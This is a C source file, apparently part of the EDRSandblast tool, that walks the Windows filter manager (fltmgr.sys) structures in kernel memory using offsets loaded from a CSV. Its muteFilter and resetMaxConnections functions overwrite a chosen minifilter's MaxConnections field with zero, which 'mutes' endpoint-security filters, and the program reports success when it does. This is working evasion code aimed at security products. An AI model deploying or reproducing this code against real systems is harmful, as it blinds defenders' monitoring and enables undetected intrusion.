/*

#include "PdbSymbols.h"
*/
#include <stdio.h>
#include <tchar.h>
#include "FileVersion.h"
#include "FltmgrOffsets.h"
#include "../EDRSandblast.h"
#include "KernelMemoryPrimitives.h"

void printFltName (USHORT firstFilterNameLenght,DWORD64 firstFilterNameAddress) {
    char* data = calloc(firstFilterNameLenght, sizeof(WCHAR));
    DWORD64 firstFilterNameBuffer = 0;
    USHORT alreadyRead = 0;
    while (alreadyRead < firstFilterNameLenght) {
        //get raw bytes
        firstFilterNameBuffer = dereferencePointer(alreadyRead + dereferencePointer(firstFilterNameAddress + 0x8)); // it's unicode string so we must goto offset+0x8 to get string address
        //copy to buffer
        memcpy(data, &firstFilterNameBuffer, sizeof(firstFilterNameBuffer));
        //print buffer
        _tprintf_or_not(TEXT("%s"), data);
        // goto next bytes
        alreadyRead = alreadyRead + (USHORT)sizeof(DWORD64);
    }
    free(data);
    data = NULL;
}

// Return the offsets of CI!g_CiOptions for the specific Windows version in use.
void LoadFltmgrOffsetsFromFile(TCHAR* fltmgrOffsetFilename) {
    BOOL verbose = FALSE;
    LPTSTR fltmgrVersion = GetFltmgrVersion();
    //_tprintf_or_not(TEXT("[*] System's fltmgr.sys file version is: %s\n"), fltmgrVersion);

    FILE* offsetFileStream = NULL;
    _tfopen_s(&offsetFileStream, fltmgrOffsetFilename, TEXT("r"));

    if (offsetFileStream == NULL) {
        _putts_or_not(TEXT("[!] Fltmgr offsets CSV file not found / invalid. A valid offset file must be specifed!\n"));
        return;
    }

    TCHAR lineCiVersion[256];
    TCHAR line[2048];
    while (_fgetts(line, _countof(line), offsetFileStream)) {
        TCHAR* dupline = _tcsdup(line);
        TCHAR* tmpBuffer = NULL;
        _tcscpy_s(lineCiVersion, _countof(lineCiVersion), _tcstok_s(dupline, TEXT(","), &tmpBuffer));
        if (sha256sum(GetFltmgrPath(), &lineCiVersion, verbose) != 0) {
            if (verbose)
                _putts_or_not(TEXT("\n[LoadFltmgrOffsetsFromFile] Bad ci.dll checksum"));
        } else {

        //if (_tcscmp(fltmgrVersion, lineCiVersion) == 0) {
            TCHAR* endptr;
            _tprintf_or_not(TEXT("[+] Offsets are available for this version of fltmgr.sys (%s)!\n"), fltmgrVersion);
            for (int i = 0; i < _SUPPORTED_FLTMGR_OFFSETS_END; i++) {
                g_fltmgrOffsets.ar[i] = _tcstoull(_tcstok_s(NULL, TEXT(","), &tmpBuffer), &endptr, 16);
            }
            break;
        }
    }
    fclose(offsetFileStream);
}

TCHAR g_fltmgrPath[MAX_PATH] = { 0 };
LPTSTR GetFltmgrPath() {
    if (_tcslen(g_fltmgrPath) == 0) {
        // Retrieves the system folder (eg C:\Windows\System32).
        TCHAR systemDirectory[MAX_PATH] = { 0 };
        GetSystemDirectory(systemDirectory, _countof(systemDirectory));

        // Compute fltmgr.sys path.
        _tcscat_s(g_fltmgrPath, _countof(g_fltmgrPath), systemDirectory);
        _tcscat_s(g_fltmgrPath, _countof(g_fltmgrPath), TEXT("\\drivers\\fltmgr.sys"));
    }
    return g_fltmgrPath;
}

TCHAR g_fltmgrVersion[256] = { 0 };
LPTSTR GetFltmgrVersion() {
    if (_tcslen(g_fltmgrVersion) == 0) {
        LPTSTR ciPath = GetFltmgrPath();

        TCHAR versionBuffer[256] = { 0 };
        GetFileVersion(versionBuffer, _countof(versionBuffer), ciPath);

        _stprintf_s(g_fltmgrVersion, 256, TEXT("fltmgr_%s.sys"), versionBuffer);
    }
    return g_fltmgrVersion;
}


//test
// NtQuerySysInfo_SystemModuleInformation.cpp : Attempts to use the NtQuerySystemInformation to find the base addresses if loaded modules.
//

//#include "stdafx.h"
//#include <windows.h>


int FindKernelModule (_In_ PCCH ModuleName,
	_Out_ PULONG_PTR ModuleBase)
{
	HMODULE ntdll = GetModuleHandle(TEXT("ntdll"));
	PNtQuerySystemInformation query = (PNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
	if (query == NULL) {
		_tprintf_or_not(TEXT("[-] GetProcAddress() failed\n"));
		return 1;
	}
	ULONG len = 0;
	query(SystemModuleInformation, NULL, 0, &len);

	PSYSTEM_MODULE_INFORMATION pModuleInfo = (PSYSTEM_MODULE_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);
	if (pModuleInfo == NULL) {
		_tprintf_or_not(TEXT("[-] Could not allocate memory for module info\n"));
		return 1;
	}
	NTSTATUS status = query(SystemModuleInformation, pModuleInfo, len, &len);

	if (status != (NTSTATUS)0x0) {
		_tprintf_or_not(TEXT("[-] NtQuerySystemInformation failed with error code 0x%X\n"), status);
		return 1;
	}
	for (unsigned int i = 0; i < pModuleInfo->ModulesCount; i++) {
		PVOID kernelImageBase = pModuleInfo->Modules[i].ImageBaseAddress;
		PCHAR kernelImage = (PCHAR)pModuleInfo->Modules[i].Name;
		PCHAR moduleNameHere = (PCHAR)(pModuleInfo->Modules[i].Name+ pModuleInfo->Modules[i].NameOffset);
		if (_stricmp(ModuleName, moduleNameHere) == 0)
		{
			*ModuleBase = kernelImageBase;
			break;
		}
	}
	return 0;
}

DWORD64 GetFltFieldOffset(enum FltmgrOffsetType fot) {
    /*
    CHAR fltMgrName[] = "FLTMGR.SYS";
    DWORD64 fltMgrBase = NULL;
    FindKernelModule(fltMgrName, &fltMgrBase);
    DWORD64 Flt_X_fieldOffset = g_fltmgrOffsets.ar[fot];
    DWORD64 Flt_X_fieldOffsetAddress = fltMgrBase + Flt_X_fieldOffset;
    return Flt_X_fieldOffsetAddress;
    */
    return g_fltmgrOffsets.ar[fot];;
}
DWORD64 dereferencePointer(DWORD64 pointerAddress) {
    return ReadMemoryDWORD64(pointerAddress);
}

void PrintFltOffsets() {
    printf("[!] fltMgr Offsets : 0x%llx | 0x%llx | 0x%llx | 0x%llx | 0x%llx | 0x%llx | 0x%llx | 0x%llx | 0x%llx | 0x%llx | 0x%llx | 0x%llx | 0x%llx | 0x%llx | 0x%llx | 0x%llx | 0x%llx | 0x%llx\n",
        g_fltmgrOffsets.st.FltGlobalsOffset, g_fltmgrOffsets.st.FrameListOffset,
        g_fltmgrOffsets.st.FrameList_rList, g_fltmgrOffsets.st.FrameLinks,
        g_fltmgrOffsets.st.RegisteredFilters, g_fltmgrOffsets.st.FilterListHead,
        g_fltmgrOffsets.st.FilterListCount, g_fltmgrOffsets.st.PrimaryLink,
        g_fltmgrOffsets.st.FilterName, g_fltmgrOffsets.st.ConnectionList,
        g_fltmgrOffsets.st.mList, g_fltmgrOffsets.st.mCount,
        g_fltmgrOffsets.st.MaxConnections, g_fltmgrOffsets.st.NumberOfConnections,
        g_fltmgrOffsets.st.srvPortCookie, g_fltmgrOffsets.st.ConnectNotify,
        g_fltmgrOffsets.st.DisconnectNotify, g_fltmgrOffsets.st.MessageNotify);
}

BOOL muteFilter(ULONG_PTR fltMgrBase, u_int FilterIndex) {
    /*    STEP 1    */
    ULONG_PTR FltGlobalsCurrentAddress = fltMgrBase + g_fltmgrOffsets.st.FltGlobalsOffset;
    ULONG_PTR FrameListCurrentAddress = FltGlobalsCurrentAddress + g_fltmgrOffsets.st.FrameListOffset;
    ULONG_PTR rListCurrentAddress = FrameListCurrentAddress + g_fltmgrOffsets.st.FrameList_rList;
    /*    STEP 2    */
    // TODO : get all Frames : it seems that only one frame exists currently but maybe in the future the frame list will be > 1 
    ULONG_PTR frame0_linksAddress = dereferencePointer(rListCurrentAddress);
    /*    STEP 3    */
    ULONG_PTR frame0_Address = frame0_linksAddress - g_fltmgrOffsets.st.FrameLinks;
    /*    STEP 4    */
    ULONG_PTR filter0_linksAddress = frame0_Address + g_fltmgrOffsets.st.RegisteredFilters + g_fltmgrOffsets.st.FilterListHead;
    ULONG_PTR filter0_count = frame0_Address + g_fltmgrOffsets.st.RegisteredFilters + g_fltmgrOffsets.st.FilterListCount;
    ULONG_PTR filterCount = dereferencePointer(filter0_count);
    /*    STEP 5    */
    // get first filter information
    ULONG_PTR firstFilterPrimarylink = dereferencePointer(filter0_linksAddress);
    /*    STEP 6    */
    ULONG_PTR firstFilterAddress = firstFilterPrimarylink - g_fltmgrOffsets.st.PrimaryLink;
    // get name test
    ULONG_PTR firstFilterNameAddress = firstFilterAddress + g_fltmgrOffsets.st.FilterName;
    USHORT firstFilterNameLenght = (u_short)dereferencePointer(firstFilterNameAddress);
    printFltName(firstFilterNameLenght, firstFilterNameAddress);
    /*    STEP 7    */
    ULONG_PTR serverPortsListAddress = firstFilterAddress + g_fltmgrOffsets.st.ConnectionList + g_fltmgrOffsets.st.mList;
    ULONG_PTR serverPort0_count = firstFilterAddress + g_fltmgrOffsets.st.ConnectionList + g_fltmgrOffsets.st.mCount;
    ULONG_PTR serverPortsCount = dereferencePointer(serverPort0_count);
    /*    STEP 8    */
    ULONG_PTR firstServerPortObjectAddress = dereferencePointer(serverPortsListAddress);
    /*    STEP 9    */
    ULONG_PTR maxConnectionsAddress = firstServerPortObjectAddress + g_fltmgrOffsets.st.MaxConnections;
    /*    STEP 10    */
    ULONG_PTR maxConnections = dereferencePointer(maxConnectionsAddress);
    /*
    STEP XX
    */
    ULONG_PTR NumberOfConnectionsAddress = firstServerPortObjectAddress + g_fltmgrOffsets.st.NumberOfConnections;
    ULONG_PTR NumberOfConnections = dereferencePointer(NumberOfConnectionsAddress);
    //
    ULONG_PTR srvPortCookieAddress = firstServerPortObjectAddress + g_fltmgrOffsets.st.srvPortCookie;
    ULONG_PTR srvPortCookie = dereferencePointer(srvPortCookieAddress);
    //
    ULONG_PTR ConnectNotifyAddress = firstServerPortObjectAddress + g_fltmgrOffsets.st.ConnectNotify;
    ULONG_PTR ConnectNotify = dereferencePointer(ConnectNotifyAddress);
    //
    ULONG_PTR DisconnectNotifyAddress = firstServerPortObjectAddress + g_fltmgrOffsets.st.DisconnectNotify;
    ULONG_PTR DisconnectNotify = dereferencePointer(DisconnectNotifyAddress);
    //
    ULONG_PTR MessageNotifyAddress = firstServerPortObjectAddress + g_fltmgrOffsets.st.MessageNotify;
    ULONG_PTR MessageNotify = dereferencePointer(MessageNotifyAddress);
    
    // just display information as Windbg style 
    _tprintf_or_not(TEXT("kd > !fltkd.frames\n"));
    _tprintf_or_not(TEXT("Frame List : 0x%llx \n"), rListCurrentAddress);
    _tprintf_or_not(TEXT("\tFLTP_FRAME: 0x%llx \"Frame 0\" \n"), frame0_Address);
    ULONG_PTR currentFilterPrimarylink = filter0_linksAddress;
    ULONG_PTR newFilterPrimarylink = 0;
    ULONG_PTR currentFilterAddress = 0;
    ULONG_PTR currentFilterNameAddress = 0;
    USHORT currentFilterNameLenght = 0;
    for (u_int cFilterLink = (u_int)filterCount; cFilterLink != 0; cFilterLink--) {
        /*
        STEP 5
        */
        // get filter information
        newFilterPrimarylink = dereferencePointer(currentFilterPrimarylink);
        /*
        STEP 6
        */
        currentFilterAddress = newFilterPrimarylink - g_fltmgrOffsets.st.PrimaryLink;
        currentFilterNameAddress = currentFilterAddress + g_fltmgrOffsets.st.FilterName;
        currentFilterNameLenght = (u_short)dereferencePointer(currentFilterNameAddress);
        //print result 
        _tprintf_or_not(TEXT("\t\t%d - FLT_FILTER : 0x%llx \""), cFilterLink, currentFilterAddress);
        printFltName(currentFilterNameLenght, currentFilterNameAddress);
        // if index of the filter is provided by the user, then we display the _FLT_SERVER_PORT_OBJECT structure content 
        if (cFilterLink == FilterIndex && FilterIndex > 0) {
            resetMaxConnections(currentFilterAddress);
            _tprintf_or_not(TEXT(" ==> Filter muted with success !"));
        }
        _tprintf_or_not(TEXT("\"\n"));
        currentFilterPrimarylink = newFilterPrimarylink;
    }
}

void resetMaxConnections(ULONG_PTR firstFilterAddress) {
    /*
    STEP 6
    */
    //_tprintf_or_not(TEXT("[+] New Step 6 - filter address : 0x%llx \n"), firstFilterAddress);
    // get name test
    ULONG_PTR firstFilterNameAddress = firstFilterAddress + g_fltmgrOffsets.st.FilterName;
    USHORT firstFilterNameLenght = (u_short)dereferencePointer(firstFilterNameAddress);
    //_tprintf_or_not(TEXT("[+] Step 6b - First filter Name lenght : %d bytes (%d chars)\n"), firstFilterNameLenght, firstFilterNameLenght / 2);
    //_tprintf_or_not(TEXT("[+] Step 6c - First filter Name string : "));

    // printFltName(firstFilterNameLenght, firstFilterNameAddress);

    /*
    STEP 7
    */
    ULONG_PTR serverPortsListAddress = firstFilterAddress + g_fltmgrOffsets.st.ConnectionList + g_fltmgrOffsets.st.mList;
    ULONG_PTR serverPort0_count = firstFilterAddress + g_fltmgrOffsets.st.ConnectionList + g_fltmgrOffsets.st.mCount;
    ULONG_PTR serverPortsCount = dereferencePointer(serverPort0_count);
    //_tprintf_or_not(TEXT("\n[+] Step 7 - Server Ports List (%d ports members): 0x%llx \n"), (u_int)serverPortsCount, serverPortsListAddress);
    /*
    STEP 8
    */
    ULONG_PTR firstServerPortObjectAddress = dereferencePointer(serverPortsListAddress);
    //(TEXT("[+] Step 8 - First Server Ports Object address : 0x%llx \n"), firstServerPortObjectAddress);
    /*
    STEP 9
    */
    ULONG_PTR maxConnectionsAddress = firstServerPortObjectAddress + g_fltmgrOffsets.st.MaxConnections;
    //_tprintf_or_not(TEXT("[+] Step 9 - Max Connections address :: 0x%llx \n"), maxConnectionsAddress);
    /*
    STEP 10
    */
    ULONG_PTR maxConnections = dereferencePointer(maxConnectionsAddress);
    //_tprintf_or_not(TEXT("[+] Step 10 - Max Connections value : %d \n"), (u_int)maxConnections);
    //test disable connections
    WriteMemoryDWORD64(maxConnectionsAddress, 0x0);

}


void fromStep6(ULONG_PTR firstFilterAddress) {
    /*
STEP 6
*/
    _tprintf_or_not(TEXT("[+] Step 6 - filter address : 0x%llx \n"), firstFilterAddress);
    // get name test
    ULONG_PTR firstFilterNameAddress = firstFilterAddress + g_fltmgrOffsets.st.FilterName;
    //UNICODE_STRING firstFilterName = (UNICODE_STRING)dereferencePointer(firstFilterNameAddress);
    //_tprintf_or_not(TEXT("[+] Step 6b - First filter Name : %s \n"), firstFilterName);
    USHORT firstFilterNameLenght = (u_short)dereferencePointer(firstFilterNameAddress);
    _tprintf_or_not(TEXT("[+] Step 6b - First filter Name lenght : %d bytes (%d chars)\n"), firstFilterNameLenght, firstFilterNameLenght / 2);
    _tprintf_or_not(TEXT("[+] Step 6c - First filter Name string : "));

    printFltName(firstFilterNameLenght, firstFilterNameAddress);

    /*
    STEP 7
    */
    ULONG_PTR serverPortsListAddress = firstFilterAddress + g_fltmgrOffsets.st.ConnectionList + g_fltmgrOffsets.st.mList;
    ULONG_PTR serverPort0_count = firstFilterAddress + g_fltmgrOffsets.st.ConnectionList + g_fltmgrOffsets.st.mCount;
    ULONG_PTR serverPortsCount = dereferencePointer(serverPort0_count);
    _tprintf_or_not(TEXT("\n[+] Step 7 - Server Ports List (%d ports members): 0x%llx \n"), (u_int)serverPortsCount, serverPortsListAddress);
    /*
    STEP 8
    */
    ULONG_PTR firstServerPortObjectAddress = dereferencePointer(serverPortsListAddress);
    _tprintf_or_not(TEXT("[+] Step 8 - First Server Ports Object address : 0x%llx \n"), firstServerPortObjectAddress);
    /*
    STEP 9
    */
    ULONG_PTR maxConnectionsAddress = firstServerPortObjectAddress + g_fltmgrOffsets.st.MaxConnections;
    _tprintf_or_not(TEXT("[+] Step 9 - Max Connections address :: 0x%llx \n"), maxConnectionsAddress);
    /*
    STEP 10
    */
    ULONG_PTR maxConnections = dereferencePointer(maxConnectionsAddress);
    _tprintf_or_not(TEXT("[+] Step 10 - Max Connections value : %d \n"), (u_int)maxConnections);
    /*
    STEP XX
    */
    ULONG_PTR NumberOfConnectionsAddress = firstServerPortObjectAddress + g_fltmgrOffsets.st.NumberOfConnections;
    ULONG_PTR NumberOfConnections = dereferencePointer(NumberOfConnectionsAddress);
    _tprintf_or_not(TEXT("[+] Step 10 - Nb of Connections value : %d \n"), (u_int)NumberOfConnections);
    //
    ULONG_PTR srvPortCookieAddress = firstServerPortObjectAddress + g_fltmgrOffsets.st.srvPortCookie;
    ULONG_PTR srvPortCookie = dereferencePointer(srvPortCookieAddress);
    _tprintf_or_not(TEXT("[+] Step 10 - srvPortCookie value : 0x%llx\n"), srvPortCookie);
    //
    ULONG_PTR ConnectNotifyAddress = firstServerPortObjectAddress + g_fltmgrOffsets.st.ConnectNotify;
    ULONG_PTR ConnectNotify = dereferencePointer(ConnectNotifyAddress);
    _tprintf_or_not(TEXT("[+] Step 10 - ConnectNotify value : 0x%llx\n"), ConnectNotify);
    //
    ULONG_PTR DisconnectNotifyAddress = firstServerPortObjectAddress + g_fltmgrOffsets.st.DisconnectNotify;
    ULONG_PTR DisconnectNotify = dereferencePointer(DisconnectNotifyAddress);
    _tprintf_or_not(TEXT("[+] Step 10 - DisconnectNotify value : 0x%llx\n"), DisconnectNotify);
    //
    ULONG_PTR MessageNotifyAddress = firstServerPortObjectAddress + g_fltmgrOffsets.st.MessageNotify;
    ULONG_PTR MessageNotify = dereferencePointer(MessageNotifyAddress);
    _tprintf_or_not(TEXT("[+] Step 10 - MessageNotify value : 0x%llx\n"), MessageNotify);

}

BOOL printFltKdFrames(ULONG_PTR fltMgrBase, u_int FilterIndex) {
    /*
    STEP 1
    */
    ULONG_PTR FltGlobalsCurrentAddress = fltMgrBase + g_fltmgrOffsets.st.FltGlobalsOffset;
    ULONG_PTR FrameListCurrentAddress = FltGlobalsCurrentAddress + g_fltmgrOffsets.st.FrameListOffset;
    ULONG_PTR rListCurrentAddress = FrameListCurrentAddress + g_fltmgrOffsets.st.FrameList_rList;
    /*
    STEP 2
    */
    // TODO : get all Frames : it seems that only one frame exists currently but maybe in the future the frame list will be > 1 
    ULONG_PTR frame0_linksAddress = dereferencePointer(rListCurrentAddress);
    /*
    STEP 3
    */
    ULONG_PTR frame0_Address = frame0_linksAddress - g_fltmgrOffsets.st.FrameLinks;
    /*
    STEP 4
    */
    // TODO : get all Filters 
    ULONG_PTR filter0_linksAddress = frame0_Address + g_fltmgrOffsets.st.RegisteredFilters + g_fltmgrOffsets.st.FilterListHead;
    ULONG_PTR filter0_count = frame0_Address + g_fltmgrOffsets.st.RegisteredFilters + g_fltmgrOffsets.st.FilterListCount;
    ULONG_PTR filterCount = dereferencePointer(filter0_count);
    _tprintf_or_not(TEXT("[+] Number of filters : %u \n"), (u_int)filterCount);
    /*
    STEP 5
    */
    // get first filter information
    ULONG_PTR firstFilterPrimarylink = dereferencePointer(filter0_linksAddress);
    /*
    STEP 6
    */
    ULONG_PTR firstFilterAddress = firstFilterPrimarylink - g_fltmgrOffsets.st.PrimaryLink;
    ULONG_PTR firstFilterNameAddress = firstFilterAddress + g_fltmgrOffsets.st.FilterName;
    USHORT firstFilterNameLenght = (u_short)dereferencePointer(firstFilterNameAddress);


    // kd> !fltkd.frames
    _tprintf_or_not(TEXT("kd > !fltkd.frames\n"));
    _tprintf_or_not(TEXT("Frame List : 0x%llx \n"), rListCurrentAddress);
    _tprintf_or_not(TEXT("\tFLTP_FRAME: 0x%llx \"Frame 0\" \n"), frame0_Address);
    ULONG_PTR currentFilterPrimarylink = filter0_linksAddress;
    ULONG_PTR newFilterPrimarylink = 0;
    ULONG_PTR currentFilterAddress = 0;
    ULONG_PTR currentFilterNameAddress = 0;
    USHORT currentFilterNameLenght = 0;
    for (u_int cFilterLink = (u_int)filterCount; cFilterLink != 0; cFilterLink--) {
        /*
        STEP 5
        */
        // get filter information
        newFilterPrimarylink = dereferencePointer(currentFilterPrimarylink);
        /*
        STEP 6
        */
        currentFilterAddress = newFilterPrimarylink - g_fltmgrOffsets.st.PrimaryLink;
        currentFilterNameAddress = currentFilterAddress + g_fltmgrOffsets.st.FilterName;
        currentFilterNameLenght = (u_short)dereferencePointer(currentFilterNameAddress);
        //print result 
        _tprintf_or_not(TEXT("\t\t%d - FLT_FILTER : 0x%llx \""), cFilterLink, currentFilterAddress);
        printFltName(currentFilterNameLenght, currentFilterNameAddress);
        _tprintf_or_not(TEXT("\"\n"));
        // if index of the filter is provided by the user, then we display the _FLT_SERVER_PORT_OBJECT structure content 
        if (cFilterLink == FilterIndex && FilterIndex > 0) {
            //print result 
            _tprintf_or_not(TEXT("<== ENUMERATE OPERATION : kernel walking from fltmgr.sys to MaxConnections ! ==>\nHere are details on filter number %d (0x%llx) named \""), cFilterLink, currentFilterAddress);
            printFltName(currentFilterNameLenght, currentFilterNameAddress);
            _tprintf_or_not(TEXT("\"\n"));
            // display result : kernel walking from fltmgr.sys to MaxConnections
            _tprintf_or_not(TEXT("[+] FLTMGR.sys current base address : 0x%llx \n"), fltMgrBase);
            _tprintf_or_not(TEXT("[+] STARTING POINT - FLTMGR!FltGlobals address : 0x%llx (0x%llx+0x%llx) \n"), FltGlobalsCurrentAddress, fltMgrBase, g_fltmgrOffsets.st.FltGlobalsOffset);
            _tprintf_or_not(TEXT("[+] Step 1 - Frame List address : 0x%llx (0x%llx+0x%llx+0x%llx) \n"), rListCurrentAddress, FltGlobalsCurrentAddress, g_fltmgrOffsets.st.FrameList_rList, g_fltmgrOffsets.st.FrameListOffset);
            _tprintf_or_not(TEXT("[+] Step 2 - First frame, field \"Links\" address : 0x%llx \n"), frame0_linksAddress);
            _tprintf_or_not(TEXT("[+] Step 3 - First frame address : 0x%llx \n"), frame0_Address);
            _tprintf_or_not(TEXT("[+] Step 4 - Filter List address : 0x%llx \n"), filter0_linksAddress);
            _tprintf_or_not(TEXT("[+] Step 5 - First filter, field \"PrimaryLink\" address : 0x%llx \n"), firstFilterPrimarylink);
            fromStep6(currentFilterAddress);
        }
        currentFilterPrimarylink = newFilterPrimarylink;
    }

}
